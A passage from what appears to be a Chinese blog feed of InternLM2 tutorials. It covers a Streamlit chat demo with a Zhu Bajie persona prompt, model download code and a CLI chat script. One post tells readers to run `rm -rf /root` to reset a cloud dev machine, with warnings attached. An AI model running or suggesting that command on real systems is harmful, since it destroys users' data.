  <span class="comment"># this config is used for chat to provide more diversity</span></span><br><span class="line">    max_length: <span class="built_in">int</span> = <span class="number">32768</span></span><br><span class="line">    top_p: <span class="built_in">float</span> = <span class="number">0.8</span></span><br><span class="line">    temperature: <span class="built_in">float</span> = <span class="number">0.8</span></span><br><span class="line">    do_sample: <span class="built_in">bool</span> = <span class="literal">True</span></span><br><span class="line">    repetition_penalty: <span class="built_in">float</span> = <span class="number">1.005</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@torch.inference_mode()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_interactive</span>(<span class="params"></span></span><br><span class="line"><span class="params">    model,</span></span><br><span class="line"><span class="params">    tokenizer,</span></span><br><span class="line"><span class="params">    prompt,</span></span><br><span class="line"><span class="params">    generation_config: <span class="type">Optional</span>[GenerationConfig] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    logits_processor: <span class="type">Optional</span>[LogitsProcessorList] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    stopping_criteria: <span class="type">Optional</span>[StoppingCriteriaList] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    prefix_allowed_tokens_fn: <span class="type">Optional</span>[<span class="type">Callable</span>[[<span class="built_in">int</span>, torch.Tensor],</span></span><br><span class="line"><span class="params">                                                <span class="type">List</span>[<span class="built_in">int</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    additional_eos_token_id: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    **kwargs,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    inputs = tokenizer([prompt], padding=<span class="literal">True</span>, return_tensors=<span class="string">&#x27;pt&#x27;</span>)</span><br><span class="line">    input_length = <span class="built_in">len</span>(inputs[<span class="string">&#x27;input_ids&#x27;</span>][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> inputs.items():</span><br><span class="line">        inputs[k] = v.cuda()</span><br><span class="line">    input_ids = inputs[<span class="string">&#x27;input_ids&#x27;</span>]</span><br><span class="line">    _, input_ids_seq_length = input_ids.shape[<span class="number">0</span>], input_ids.shape[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> generation_config <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        generation_config = model.generation_config</span><br><span class="line">    generation_config = copy.deepcopy(generation_config)</span><br><span class="line">    model_kwargs = generation_config.update(**kwargs)</span><br><span class="line">    bos_token_id, eos_token_id = (  <span class="comment"># noqa: F841  # pylint: disable=W0612</span></span><br><span class="line">        generation_config.bos_token_id,</span><br><span class="line">        generation_config.eos_token_id,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(eos_token_id, <span class="built_in">int</span>):</span><br><span class="line">        eos_token_id = [eos_token_id]</span><br><span class="line">    <span class="keyword">if</span> additional_eos_token_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        eos_token_id.append(additional_eos_token_id)</span><br><span class="line">    has_default_max_length = kwargs.get(</span><br><span class="line">        <span class="string">&#x27;max_length&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> generation_config.max_length <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> has_default_max_length <span class="keyword">and</span> generation_config.max_new_tokens <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        warnings.warn(</span><br><span class="line">            <span class="string">f&quot;Using &#x27;max_length&#x27;&#x27;s default (<span class="subst">&#123;<span class="built_in">repr</span>(generation_config.max_length)&#125;</span>) \</span></span><br><span class="line"><span class="string">                to control the generation length. &quot;</span></span><br><span class="line">            <span class="string">&#x27;This behaviour is deprecated and will be removed from the \</span></span><br><span class="line"><span class="string">                config in v5 of Transformers -- we&#x27;</span></span><br><span class="line">            <span class="string">&#x27; recommend using `max_new_tokens` to control the maximum \</span></span><br><span class="line"><span class="string">                length of the generation.&#x27;</span>,</span><br><span class="line">            UserWarning,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> generation_config.max_new_tokens <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        generation_config.max_length = generation_config.max_new_tokens + \</span><br><span class="line">            input_ids_seq_length</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> has_default_max_length:</span><br><span class="line">            logger.warn(  <span class="comment"># pylint: disable=W4902</span></span><br><span class="line">                <span class="string">f&quot;Both &#x27;max_new_tokens&#x27; (=<span class="subst">&#123;generation_config.max_new_tokens&#125;</span>) &quot;</span></span><br><span class="line">                <span class="string">f&quot;and &#x27;max_length&#x27;(=<span class="subst">&#123;generation_config.max_length&#125;</span>) seem to &quot;</span></span><br><span class="line">                <span class="string">&quot;have been set. &#x27;max_new_tokens&#x27; will take precedence. &quot;</span></span><br><span class="line">                <span class="string">&#x27;Please refer to the documentation for more information. &#x27;</span></span><br><span class="line">                <span class="string">&#x27;(https://huggingface.co/docs/transformers/main/&#x27;</span></span><br><span class="line">                <span class="string">&#x27;en/main_classes/text_generation)&#x27;</span>,</span><br><span class="line">                UserWarning,</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_ids_seq_length &gt;= generation_config.max_length:</span><br><span class="line">        input_ids_string = <span class="string">&#x27;input_ids&#x27;</span></span><br><span class="line">        logger.warning(</span><br><span class="line">            <span class="string">f&quot;Input length of <span class="subst">&#123;input_ids_string&#125;</span> is <span class="subst">&#123;input_ids_seq_length&#125;</span>, &quot;</span></span><br><span class="line">            <span class="string">f&quot;but &#x27;max_length&#x27; is set to <span class="subst">&#123;generation_config.max_length&#125;</span>. &quot;</span></span><br><span class="line">            <span class="string">&#x27;This can lead to unexpected behavior. You should consider&#x27;</span></span><br><span class="line">            <span class="string">&quot; increasing &#x27;max_new_tokens&#x27;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Set generation parameters if not already defined</span></span><br><span class="line">    logits_processor = logits_processor <span class="keyword">if</span> logits_processor <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> \</span><br><span class="line">        <span class="keyword">else</span> LogitsProcessorList()</span><br><span class="line">    stopping_criteria = stopping_criteria <span class="keyword">if</span> stopping_criteria <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> \</span><br><span class="line">        <span class="keyword">else</span> StoppingCriteriaList()</span><br><span class="line"></span><br><span class="line">    logits_processor = model._get_logits_processor(</span><br><span class="line">        generation_config=generation_config,</span><br><span class="line">        input_ids_seq_length=input_ids_seq_length,</span><br><span class="line">        encoder_input_ids=input_ids,</span><br><span class="line">        prefix_allowed_tokens_fn=prefix_allowed_tokens_fn,</span><br><span class="line">        logits_processor=logits_processor,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    stopping_criteria = model._get_stopping_criteria(</span><br><span class="line">        generation_config=generation_config,</span><br><span class="line">        stopping_criteria=stopping_criteria)</span><br><span class="line">    logits_warper = model._get_logits_warper(generation_config)</span><br><span class="line"></span><br><span class="line">    unfinished_sequences = input_ids.new(input_ids.shape[<span class="number">0</span>]).fill_(<span class="number">1</span>)</span><br><span class="line">    scores = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        model_inputs = model.prepare_inputs_for_generation(</span><br><span class="line">            input_ids, **model_kwargs)</span><br><span class="line">        <span class="comment"># forward pass to get next token</span></span><br><span class="line">        outputs = model(</span><br><span class="line">            **model_inputs,</span><br><span class="line">            return_dict=<span class="literal">True</span>,</span><br><span class="line">            output_attentions=<span class="literal">False</span>,</span><br><span class="line">            output_hidden_states=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        next_token_logits = outputs.logits[:, -<span class="number">1</span>, :]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pre-process distribution</span></span><br><span class="line">        next_token_scores = logits_processor(input_ids, next_token_logits)</span><br><span class="line">        next_token_scores = logits_warper(input_ids, next_token_scores)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># sample</span></span><br><span class="line">        probs = nn.functional.softmax(next_token_scores, dim=-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> generation_config.do_sample:</span><br><span class="line">            next_tokens = torch.multinomial(probs, num_samples=<span class="number">1</span>).squeeze(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            next_tokens = torch.argmax(probs, dim=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># update generated ids, model inputs, and length for next step</span></span><br><span class="line">        input_ids = torch.cat([input_ids, next_tokens[:, <span class="literal">None</span>]], dim=-<span class="number">1</span>)</span><br><span class="line">        model_kwargs = model._update_model_kwargs_for_generation(</span><br><span class="line">            outputs, model_kwargs, is_encoder_decoder=<span class="literal">False</span>)</span><br><span class="line">        unfinished_sequences = unfinished_sequences.mul(</span><br><span class="line">            (<span class="built_in">min</span>(next_tokens != i <span class="keyword">for</span> i <span class="keyword">in</span> eos_token_id)).long())</span><br><span class="line"></span><br><span class="line">        output_token_ids = input_ids[<span class="number">0</span>].cpu().tolist()</span><br><span class="line">        output_token_ids = output_token_ids[input_length:]</span><br><span class="line">        <span class="keyword">for</span> each_eos_token_id <span class="keyword">in</span> eos_token_id:</span><br><span class="line">            <span class="keyword">if</span> output_token_ids[-<span class="number">1</span>] == each_eos_token_id:</span><br><span class="line">                output_token_ids = output_token_ids[:-<span class="number">1</span>]</span><br><span class="line">        response = tokenizer.decode(output_token_ids)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> response</span><br><span class="line">        <span class="comment"># stop when each sentence is finished</span></span><br><span class="line">        <span class="comment"># or if we exceed the maximum length</span></span><br><span class="line">        <span class="keyword">if</span> unfinished_sequences.<span class="built_in">max</span>() == <span class="number">0</span> <span class="keyword">or</span> stopping_criteria(</span><br><span class="line">                input_ids, scores):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_btn_click</span>():</span><br><span class="line">    <span class="keyword">del</span> st.session_state.messages</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@st.cache_resource</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_model</span>():</span><br><span class="line">    model = (AutoModelForCausalLM.from_pretrained(<span class="string">&#x27;/root/models/JimmyMa99/BaJie-Chat-mini&#x27;</span>,</span><br><span class="line">                                                  trust_remote_code=<span class="literal">True</span>).to(</span><br><span class="line">                                                      torch.bfloat16).cuda())</span><br><span class="line">    tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;/root/models/JimmyMa99/BaJie-Chat-mini&#x27;</span>,</span><br><span class="line">                                              trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> model, tokenizer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_generation_config</span>():</span><br><span class="line">    <span class="keyword">with</span> st.sidebar:</span><br><span class="line">        max_length = st.slider(<span class="string">&#x27;Max Length&#x27;</span>,</span><br><span class="line">                               min_value=<span class="number">8</span>,</span><br><span class="line">                               max_value=<span class="number">32768</span>,</span><br><span class="line">                               value=<span class="number">32768</span>)</span><br><span class="line">        top_p = st.slider(<span class="string">&#x27;Top P&#x27;</span>, <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.8</span>, step=<span class="number">0.01</span>)</span><br><span class="line">        temperature = st.slider(<span class="string">&#x27;Temperature&#x27;</span>, <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.7</span>, step=<span class="number">0.01</span>)</span><br><span class="line">        st.button(<span class="string">&#x27;Clear Chat History&#x27;</span>, on_click=on_btn_click)</span><br><span class="line"></span><br><span class="line">    generation_config = GenerationConfig(max_length=max_length,</span><br><span class="line">                                         top_p=top_p,</span><br><span class="line">                                         temperature=temperature)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> generation_config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_prompt = <span class="string">&#x27;&lt;|im_start|&gt;user\n&#123;user&#125;&lt;|im_end|&gt;\n&#x27;</span></span><br><span class="line">robot_prompt = <span class="string">&#x27;&lt;|im_start|&gt;assistant\n&#123;robot&#125;&lt;|im_end|&gt;\n&#x27;</span></span><br><span class="line">cur_query_prompt = <span class="string">&#x27;&lt;|im_start|&gt;user\n&#123;user&#125;&lt;|im_end|&gt;\n\</span></span><br><span class="line"><span class="string">    &lt;|im_start|&gt;assistant\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">combine_history</span>(<span class="params">prompt</span>):</span><br><span class="line">    messages = st.session_state.messages</span><br><span class="line">    meta_instruction = (<span class="string">&#x27;你是猪八戒，猪八戒说话幽默风趣，说话方式通常表现为直率、幽默，有时带有一点自嘲和调侃。&#x27;</span></span><br><span class="line">                        <span class="string">&#x27;你的话语中常常透露出对食物的喜爱和对安逸生活的向往，同时也显示出他机智和有时的懒惰特点。&#x27;</span></span><br><span class="line">                        <span class="string">&#x27;尽量保持回答的自然回答，当然你也可以适当穿插一些文言文，另外，书生·浦语是你的好朋友，是你的AI助手。&#x27;</span>)</span><br><span class="line">    total_prompt = <span class="string">f&quot;&lt;s&gt;&lt;|im_start|&gt;system\n<span class="subst">&#123;meta_instruction&#125;</span>&lt;|im_end|&gt;\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> message <span class="keyword">in</span> messages:</span><br><span class="line">        cur_content = message[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> message[<span class="string">&#x27;role&#x27;</span>] == <span class="string">&#x27;user&#x27;</span>:</span><br><span class="line">            cur_prompt = user_prompt.<span class="built_in">format</span>(user=cur_content)</span><br><span class="line">        <span class="keyword">elif</span> message[<span class="string">&#x27;role&#x27;</span>] == <span class="string">&#x27;robot&#x27;</span>:</span><br><span class="line">            cur_prompt = robot_prompt.<span class="built_in">format</span>(robot=cur_content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError</span><br><span class="line">        total_prompt += cur_prompt</span><br><span class="line">    total_prompt = total_prompt + cur_query_prompt.<span class="built_in">format</span>(user=prompt)</span><br><span class="line">    <span class="keyword">return</span> total_prompt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># torch.cuda.empty_cache()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load model begin.&#x27;</span>)</span><br><span class="line">    model, tokenizer = load_model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load model end.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    st.title(<span class="string">&#x27;猪猪Chat-InternLM2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    generation_config = prepare_generation_config()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize chat history</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;messages&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> st.session_state:</span><br><span class="line">        st.session_state.messages = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Display chat messages from history on app rerun</span></span><br><span class="line">    <span class="keyword">for</span> message <span class="keyword">in</span> st.session_state.messages:</span><br><span class="line">        <span class="keyword">with</span> st.chat_message(message[<span class="string">&#x27;role&#x27;</span>]):</span><br><span class="line">            st.markdown(message[<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Accept user input</span></span><br><span class="line">    <span class="keyword">if</span> prompt := st.chat_input(<span class="string">&#x27;What is up?&#x27;</span>):</span><br><span class="line">        <span class="comment"># Display user message in chat message container</span></span><br><span class="line">        <span class="keyword">with</span> st.chat_message(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">            st.markdown(prompt)</span><br><span class="line">        real_prompt = combine_history(prompt)</span><br><span class="line">        <span class="comment"># Add user message to chat history</span></span><br><span class="line">        st.session_state.messages.append(&#123;</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>: prompt,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> st.chat_message(<span class="string">&#x27;robot&#x27;</span>):</span><br><span class="line">            message_placeholder = st.empty()</span><br><span class="line">            <span class="keyword">for</span> cur_response <span class="keyword">in</span> generate_interactive(</span><br><span class="line">                    model=model,</span><br><span class="line">                    tokenizer=tokenizer,</span><br><span class="line">                    prompt=real_prompt,</span><br><span class="line">                    additional_eos_token_id=<span class="number">92542</span>,</span><br><span class="line">                    **asdict(generation_config),</span><br><span class="line">            ):</span><br><span class="line">                <span class="comment"># Display robot response in chat message container</span></span><br><span class="line">                message_placeholder.markdown(cur_response + <span class="string">&#x27;▌&#x27;</span>)</span><br><span class="line">            message_placeholder.markdown(cur_response)</span><br><span class="line">        <span class="comment"># Add robot response to chat history</span></span><br><span class="line">        st.session_state.messages.append(&#123;</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;robot&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>: cur_response,  <span class="comment"># pylint: disable=undefined-loop-variable</span></span><br><span class="line">        &#125;)</span><br><span class="line">        torch.cuda.empty_cache()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>访问网站时还是报错，如下：</p><blockquote><p>ModuleNotFoundError: No module named ‘transformers_modules.BaJie-Chat-mini’</p></blockquote><hr><h1 id="2-部署成功"><a href="#2-部署成功" class="headerlink" title="2 部署成功"></a>2 部署成功</h1><p>可能由于文件出现问题，重新克隆代码，成功运行模型。</p><p><img src="/2024/06/05/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%982/image_auOtcejHw_.png"></p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
            <tag> 书生·浦语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书生·浦语大模型实战1</title>
      <link href="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/"/>
      <url>/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装环境"><a href="#1-安装环境" class="headerlink" title="1 安装环境"></a>1 安装环境</h1><p>在刚打开开发机的过程中显示没有文件或路径，如下：</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_fmW2PipNzL.png"></p><p>应该是误删了什么东西，因为指导书中写了一开始就配有 base 环境，但是我的没有，所以考虑重置一下环境吧。</p><p>以下是操作步骤：</p><blockquote><p><em><strong>慎重执行！！！！所有数据将会丢失，仅限 InternStudio 平台，自己的机器千万别这么操作</strong></em>*<br>第一步本地终端 ssh 连上开发机（一定要 ssh 连接上操作，不能在 web 里面操作！！！）<br>第二步执行 **<code>rm -rf /root</code>*<em>，大概会等待10分钟<br>第三步重启开发机，系统会重置 &#x2F;root 路径下的配置文件<br>第四步 *</em><code>ln -s /share /root/share</code>*</p></blockquote><p>这里需要配置本地 SSH 远程连接，因此需要生成公钥和私钥，参考网上教程进行连接，连接成功如下：</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_gMmzARNXIo.png"></p><p>接下来进行删除操作并重置环境。</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_xsam72UxXL.png"></p><p>可以看到，重新启动后没有那句报错了，成功解决，并且也有了初始环境 base，看一下接下来安装 conda 环境有没有错误。</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_t1LTgERiZI.png"></p><p>下载 conda 环境成功：</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_-Oyr3E1_Kk.png"></p><hr><h1 id="2-下载模型"><a href="#2-下载模型" class="headerlink" title="2 下载模型"></a>2 下载模型</h1><p>新建文件 download_mini.py，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> modelscope.hub.snapshot_download <span class="keyword">import</span> snapshot_download</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建保存模型目录</span></span><br><span class="line">os.system(<span class="string">&quot;mkdir /root/models&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># save_dir是模型保存到本地的目录</span></span><br><span class="line">save_dir=<span class="string">&quot;/root/models&quot;</span></span><br><span class="line"></span><br><span class="line">snapshot_download(<span class="string">&quot;Shanghai_AI_Laboratory/internlm2-chat-1_8b&quot;</span>, </span><br><span class="line">                  cache_dir=save_dir, </span><br><span class="line">                  revision=<span class="string">&#x27;v1.1.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这段代码的作用是用来下载模型，其中snapshot_download用于从hub中下载模型，那么这个hub是什么呢？以下是简要介绍：</p><p>官网：<a href="https://huggingface.co/" title="Hugging Face – The AI community building the future.">Hugging Face – The AI community building the future.</a></p><p>Hugging Face Hub和 Github 类似，都是Hub(社区)。Hugging Face可以说的上是机器学习界的Github。Hugging Face为用户提供了以下主要功能：</p><ol><li>模型仓库（Model Repository）：Git仓库可以让你管理代码版本、开源代码。而模型仓库可以让你管理模型版本、开源模型等。使用方式与Github类似。</li><li>模型（Models）：Hugging Face为不同的机器学习任务提供了许多预训练好的机器学习模型供大家使用，这些模型就存储在模型仓库中。</li><li>数据集（Dataset）：Hugging Face上有许多公开数据集。</li></ol><p>hugging face在NLP领域最出名，其提供的模型大多都是基于Transformer的。为了易用性，Hugging Face还为用户提供了以下几个项目：</p><ul><li>Transformers(github, 官方文档)：Transformers提供了上千个预训练好的模型可以用于不同的任务，例如文本领域、音频领域和CV领域。该项目是HuggingFace的核心，可以说学习HuggingFace就是在学习该项目如何使用。</li><li>Datasets(github, 官方文档)：一个轻量级的数据集框架，主要有两个功能：<ul><li>一行代码下载和预处理常用的公开数据集；</li><li>快速、易用的数据预处理类库。</li></ul></li><li>Accelerate(github, 官方文档)：帮助Pytorch用户很方便的实现 multi-GPU&#x2F;TPU&#x2F;fp16。</li></ul><p>之后使用新装的环境demo来执行上述代码：<code>python /root/demo/download_mini.py</code>，执行结果如下：</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_Rh81lpEumW.png"></p><hr><h1 id="3-运行-cli-demo"><a href="#3-运行-cli-demo" class="headerlink" title="3 运行 cli_demo"></a>3 运行 cli_demo</h1><p>新建文件cli_demo.py，内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM</span><br><span class="line"></span><br><span class="line">model_name_or_path = <span class="string">&quot;/root/models/Shanghai_AI_Laboratory/internlm2-chat-1_8b&quot;</span></span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(model_name_or_path, trust_remote_code=<span class="literal">True</span>, device_map=<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">model = AutoModelForCausalLM.from_pretrained(model_name_or_path, trust_remote_code=<span class="literal">True</span>, torch_dtype=torch.bfloat16, device_map=<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">model = model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">system_prompt = <span class="string">&quot;&quot;&quot;You are an AI assistant whose name is InternLM (书生·浦语).</span></span><br><span class="line"><span class="string">- InternLM (书生·浦语) is a conversational language model that is developed by Shanghai AI Laboratory (上海人工智能实验室). It is designed to be helpful, honest, and harmless.</span></span><br><span class="line"><span class="string">- InternLM (书生·浦语) can understand and communicate fluently in the language chosen by the user such as English and 中文.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">messages = [(system_prompt, <span class="string">&#x27;&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=============Welcome to InternLM chatbot, type &#x27;exit&#x27; to exit.=============&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    input_text = <span class="built_in">input</span>(<span class="string">&quot;\nUser  &gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    input_text = input_text.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> input_text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> response, _ <span class="keyword">in</span> model.stream_chat(tokenizer, input_text, messages):</span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(response[length:], flush=<span class="literal">True</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            length = <span class="built_in">len</span>(response)</span><br></pre></td></tr></table></figure><p>代码解释：</p><ul><li><code>AutoTokenizer.from_pretrained()</code> 用于从指定的预训练模型名称或路径中加载相应的分词器。<ul><li>参数 <code>trust_remote_code=True</code> 表示信任远程模型的代码</li><li><code>device_map=&#39;cuda:0&#39;</code> 指定在 GPU 上运行。这将加载模型的分词器</li></ul></li><li><code>AutoModelForCausalLM.from_pretrained()</code> 用于从指定的预训练模型名称或路径中加载相应的模型，<strong>这里的模型就是我们第二步中下载的模型</strong>。<ul><li>参数 <code>trust_remote_code=True</code> 表示信任远程模型的代码</li><li><code>torch_dtype=torch.bfloat16</code> 表示使用 <code>bfloat16</code>减少精度</li><li><code>device_map=&#39;cuda:0&#39;</code> 指定在 GPU 上运行。这将加载模型</li></ul></li></ul><p>最后有一个循环，其中接受用户输入并将其提供给模型，模型生成响应。响应被打印出来，直到用户输入 ‘exit’ 来退出对话。</p><p>使用demo环境运行代码：<code>python cli_demo.py</code>，运行结果如下：</p><p><img src="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%981/image_mARHJm5mcB.png"></p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
            <tag> 书生·浦语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书生·浦语大模型笔记1</title>
      <link href="/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%AC%94%E8%AE%B01/"/>
      <url>/2024/06/03/%E4%B9%A6%E7%94%9F%C2%B7%E6%B5%A6%E8%AF%AD%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%AC%94%E8%AE%B01/</url>
      
